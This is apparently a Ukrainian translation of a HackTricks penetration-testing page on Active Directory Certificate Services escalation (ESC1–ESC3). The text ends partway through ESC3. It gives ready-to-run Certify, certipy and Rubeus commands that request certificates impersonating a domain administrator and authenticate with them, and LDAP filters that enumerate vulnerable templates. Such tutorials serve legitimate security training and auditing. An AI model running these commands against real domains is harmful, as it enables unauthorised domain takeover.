# AD CS Domain Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**–¶–µ —Ä–µ–∑—é–º–µ —Å–µ–∫—Ü—ñ–π —Ç–µ—Ö–Ω—ñ–∫ –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø–æ—Å—Ç—ñ–≤:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ - ESC1

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

### –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ - ESC1 –ü–æ—è—Å–Ω–µ–Ω–æ

* **–ü—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –Ω–∞–¥–∞—é—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ —á–µ—Ä–µ–∑ Enterprise CA.**
* **–ó–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–µ.**
* **–ù–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—ñ–¥–ø–∏—Å–∏ —É–ø–æ–≤–Ω–æ–≤–∞–∂–µ–Ω–∏—Ö –æ—Å—ñ–±.**
* **–ë–µ–∑–ø–µ–∫–æ–≤—ñ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ –Ω–∞ —à–∞–±–ª–æ–Ω–∞—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ —î –Ω–∞–¥—Ç–æ –ª—ñ–±–µ—Ä–∞–ª—å–Ω–∏–º–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é.**
* **–®–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è EKU, —è–∫—ñ –ø–æ–ª–µ–≥—à—É—é—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é:**
* –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫–ª—é—á—ñ–≤ (EKU), —Ç–∞–∫—ñ —è–∫ –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–ª—ñ—î–Ω—Ç–∞ (OID 1.3.6.1.5.5.7.3.2), –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–ª—ñ—î–Ω—Ç–∞ PKINIT (1.3.6.1.5.2.3.4), –í—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–º–∞—Ä—Ç-–∫–∞—Ä—Ç–∫–∏ (OID 1.3.6.1.4.1.311.20.2.2), –ë—É–¥—å-—è–∫–∞ –º–µ—Ç–∞ (OID 2.5.29.37.0) –∞–±–æ –±–µ–∑ EKU (SubCA) –≤–∫–ª—é—á–µ–Ω—ñ.
* **–®–∞–±–ª–æ–Ω –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–∏—Ç—É–≤–∞—á–∞–º –≤–∫–ª—é—á–∞—Ç–∏ subjectAltName —É –ó–∞–ø–∏—Ç –Ω–∞ –ø—ñ–¥–ø–∏—Å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ (CSR):**
* Active Directory (AD) –Ω–∞–¥–∞—î –ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç subjectAltName (SAN) —É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –æ—Å–æ–±–∏, —è–∫—â–æ –≤—ñ–Ω –ø—Ä–∏—Å—É—Ç–Ω—ñ–π. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ, –≤–∫–∞–∑—É—é—á–∏ SAN —É CSR, –º–æ–∂–Ω–∞ –∑–∞–ø–∏—Ç–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–ª—è –≤–∏–¥–∞—á—ñ –≤—ñ–¥ —ñ–º–µ–Ω—ñ –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–º–µ–Ω—É). –ß–∏ –º–æ–∂–µ –∑–∞–ø–∏—Ç—É–≤–∞—á –≤–∫–∞–∑–∞—Ç–∏ SAN, –≤–∫–∞–∑—É—î—Ç—å—Å—è –≤ –æ–±'—î–∫—Ç—ñ AD —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ —á–µ—Ä–µ–∑ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `mspki-certificate-name-flag`. –¶—è –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å —î –±—ñ—Ç–æ–≤–æ—é –º–∞—Å–∫–æ—é, —ñ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –ø—Ä–∞–ø–æ—Ä–∞ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–∏—Ç—É–≤–∞—á—É –≤–∫–∞–∑—É–≤–∞—Ç–∏ SAN.

{% hint style="danger" %}
–¶—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –∑ –±—É–¥—å-—è–∫–∏–º –≤–∏–±—Ä–∞–Ω–∏–º SAN, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —è–∫ –±—É–¥—å-—è–∫–æ–≥–æ –¥–æ–º–µ–Ω–Ω–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞ —á–µ—Ä–µ–∑ Kerberos –∞–±–æ SChannel.
{% endhint %}

–¶—è —Ñ—É–Ω–∫—Ü—ñ—è —ñ–Ω–æ–¥—ñ –∞–∫—Ç–∏–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó HTTPS –∞–±–æ —Ö–æ—Å—Ç-—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –Ω–∞ –ª—å–æ—Ç—É –ø—Ä–æ–¥—É–∫—Ç–∞–º–∏ –∞–±–æ —Å–ª—É–∂–±–∞–º–∏ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è, –∞–±–æ —á–µ—Ä–µ–∑ –±—Ä–∞–∫ —Ä–æ–∑—É–º—ñ–Ω–Ω—è.

–ó–∞–∑–Ω–∞—á–µ–Ω–æ, —â–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –∑ —Ü—ñ—î—é –æ–ø—Ü—ñ—î—é –≤–∏–∫–ª–∏–∫–∞—î –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è, —á–æ–≥–æ –Ω–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ —ñ—Å–Ω—É—é—á–∏–π —à–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ (—Ç–∞–∫–∏–π —è–∫ —à–∞–±–ª–æ–Ω `WebServer`, —É —è–∫–æ–≥–æ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) –¥—É–±–ª—é—î—Ç—å—Å—è, –∞ –ø–æ—Ç—ñ–º –º–æ–¥–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è OID –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–©–æ–± **–∑–Ω–∞–π—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
–©–æ–± **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é –¥–ª—è –≤–∏–¥–∞–≤–∞–Ω–Ω—è —Å–µ–±–µ –∑–∞ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞**, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
–¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —É —Ñ–æ—Ä–º–∞—Ç `.pfx`** —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Rubeus –∞–±–æ certipy** –∑–Ω–æ–≤—É:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
–í—ñ–∫–æ–Ω–Ω—ñ –¥–≤—ñ–π–∫–æ–≤—ñ —Ñ–∞–π–ª–∏ "Certreq.exe" —Ç–∞ "Certutil.exe" –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

–ü–µ—Ä–µ—Ä–∞—Ö—É–Ω–æ–∫ —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ —É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ–π —Å—Ö–µ–º—ñ –ª—ñ—Å—É AD, –∑–æ–∫—Ä–µ–º–∞ —Ç–∏—Ö, —è–∫—ñ –Ω–µ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å –∑–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∞–±–æ –ø—ñ–¥–ø–∏—Å—ñ–≤, —â–æ –º–∞—é—Ç—å EKU –¥–ª—è –∫–ª—ñ—î–Ω—Ç—Å—å–∫–æ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∞–±–æ Smart Card Logon, —Ç–∞ –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º –ø—Ä–∞–ø–æ—Ä–æ–º `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π LDAP –∑–∞–ø–∏—Ç:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ - ESC2

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–î—Ä—É–≥–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —î –≤–∞—Ä—ñ–∞—Ü—ñ—î—é –ø–µ—Ä—à–æ–≥–æ:

1. –ü—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –Ω–∞–¥–∞—é—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ —á–µ—Ä–µ–∑ Enterprise CA.
2. –í–∏–º–æ–≥–∞ –Ω–∞ –∑–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –≤–∏–º–∫–Ω–µ–Ω–∞.
3. –ù–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –ø—ñ–¥–ø–∏—Å—ñ–≤ –ø—Ä–æ–ø—É—â–µ–Ω–∞.
4. –ù–∞–¥–º—ñ—Ä–Ω–æ –¥–æ–∑–≤–æ–ª—è—é—á–∏–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –±–µ–∑–ø–µ–∫–∏ –Ω–∞ —à–∞–±–ª–æ–Ω—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –Ω–∞–¥–∞—î –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.
5. **–®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤–∏–∑–Ω–∞—á–µ–Ω–æ —Ç–∞–∫, —â–æ–± –≤–∫–ª—é—á–∞—Ç–∏ Any Purpose EKU –∞–±–æ –Ω–µ –º–∞—Ç–∏ EKU.**

**Any Purpose EKU** –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–ª—è **–±—É–¥—å-—è–∫–æ—ó –º–µ—Ç–∏**, –≤–∫–ª—é—á–∞—é—á–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∫–ª—ñ—î–Ω—Ç–∞, –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —Å–µ—Ä–≤–µ—Ä–∞, –ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è –∫–æ–¥—É —Ç–æ—â–æ. –¢–∞ –∂ **—Ç–µ—Ö–Ω—ñ–∫–∞, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è ESC3**, –º–æ–∂–µ –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–∞ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—å–æ–≥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é.

–°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –∑ **–±–µ–∑ EKU**, —è–∫—ñ –¥—ñ—é—Ç—å —è–∫ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –ø—ñ–¥–ø–æ—Ä—è–¥–∫–æ–≤–∞–Ω–æ–≥–æ CA, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è **–±—É–¥—å-—è–∫–æ—ó –º–µ—Ç–∏** —ñ **—Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è –Ω–æ–≤–∏—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤**. –û—Ç–∂–µ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∫–∞–∑–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ EKU –∞–±–æ –ø–æ–ª—è –≤ –Ω–æ–≤–∏—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –ø—ñ–¥–ø–æ—Ä—è–¥–∫–æ–≤–∞–Ω–æ–≥–æ CA.

–û–¥–Ω–∞–∫ –Ω–æ–≤—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –¥–ª—è **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ–º–µ–Ω—É**, –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º—É—Ç—å, —è–∫—â–æ –ø—ñ–¥–ø–æ—Ä—è–¥–∫–æ–≤–∞–Ω–∏–π CA –Ω–µ –¥–æ–≤—ñ—Ä—è—î—Ç—å—Å—è –æ–±'—î–∫—Ç—É **`NTAuthCertificates`**, —â–æ —î –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º. –ü—Ä–æ—Ç–µ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤—Å–µ —â–µ –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ **–Ω–æ–≤—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –∑ –±—É–¥—å-—è–∫–∏–º EKU** —Ç–∞ –¥–æ–≤—ñ–ª—å–Ω–∏–º–∏ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤. –¶—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ **–∑–ª–æ–≤–∂–∏–≤–∞–Ω—ñ** –¥–ª—è —à–∏—Ä–æ–∫–æ–≥–æ —Å–ø–µ–∫—Ç—Ä—É —Ü—ñ–ª–µ–π (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è –∫–æ–¥—É, –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è —Å–µ—Ä–≤–µ—Ä–∞ —Ç–æ—â–æ) —ñ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ –∑–Ω–∞—á–Ω—ñ –Ω–∞—Å–ª—ñ–¥–∫–∏ –¥–ª—è —ñ–Ω—à–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤ —É –º–µ—Ä–µ–∂—ñ, —Ç–∞–∫–∏—Ö —è–∫ SAML, AD FS –∞–±–æ IPSec.

–©–æ–± –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —à–∞–±–ª–æ–Ω–∏, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—é –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ–π —Å—Ö–µ–º—ñ –ª—ñ—Å—É AD, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π LDAP –∑–∞–ø–∏—Ç:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ —à–∞–±–ª–æ–Ω–∏ –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó - ESC3

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π —Å—Ö–æ–∂–∏–π –Ω–∞ –ø–µ—Ä—à–∏–π —ñ –¥—Ä—É–≥–∏–π, –∞–ª–µ **–∑–ª–æ–≤–∂–∏–≤–∞—î** **—ñ–Ω—à–∏–º EKU** (–ê–≥–µ–Ω—Ç –∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞) —Ç–∞ **2 —Ä—ñ–∑–Ω–∏–º–∏ —à–∞–±–ª–æ–Ω–∞–º–∏** (–æ—Ç–∂–µ, –º–∞—î 2 –Ω–∞–±–æ—Ä–∏ –≤–∏–º–æ–≥),

**EKU –∞–≥–µ–Ω—Ç–∞ –∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞** (OID 1.3.6.1.4.1.311.20.2.1), –≤—ñ–¥–æ–º–∏–π —è–∫ **–ê–≥–µ–Ω—Ç —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó** –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó Microsoft, –¥–æ–∑–≤–æ–ª—è—î —Å—É–±'—î–∫—Ç—É **—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è** –Ω–∞ **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç** **–≤—ñ–¥ —ñ–º–µ–Ω—ñ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**.

**‚Äú–ê–≥–µ–Ω—Ç —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó‚Äù** —Ä–µ—î—Å—Ç—Ä—É—î—Ç—å—Å—è –≤ —Ç–∞–∫–æ–º—É **—à–∞–±–ª–æ–Ω—ñ** —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –æ—Ç—Ä–∏–º–∞–Ω–∏–π **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–ª—è —Å–ø—ñ–ª—å–Ω–æ–≥–æ –ø—ñ–¥–ø–∏—Å–∞–Ω–Ω—è CSR –≤—ñ–¥ —ñ–º–µ–Ω—ñ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**. –ü–æ—Ç—ñ–º –≤—ñ–Ω **–Ω–∞–¥—Å–∏–ª–∞—î** **—Å–ø—ñ–ª—å–Ω–æ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π CSR** –¥–æ CA, —Ä–µ—î—Å—Ç—Ä—É—é—á–∏—Å—å —É **—à–∞–±–ª–æ–Ω—ñ**, —è–∫–∏–π **–¥–æ–∑–≤–æ–ª—è—î ‚Äú—Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –≤—ñ–¥ —ñ–º–µ–Ω—ñ‚Äù**, —ñ CA –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, —â–æ –Ω–∞–ª–µ–∂–∏—Ç—å ‚Äú—ñ–Ω—à–æ–º—É‚Äù –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É**.

**–í–∏–º–æ–≥–∏ 1:**

* –ü—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –Ω–∞–¥–∞—é—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ —á–µ—Ä–µ–∑ Enterprise CA.
* –í–∏–º–æ–≥–∞ –Ω–∞ –∑–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –ø—Ä–æ–ø—É—Å–∫–∞—î—Ç—å—Å—è.
* –ù–µ–º–∞—î –≤–∏–º–æ–≥–∏ –Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ñ –ø—ñ–¥–ø–∏—Å–∏.
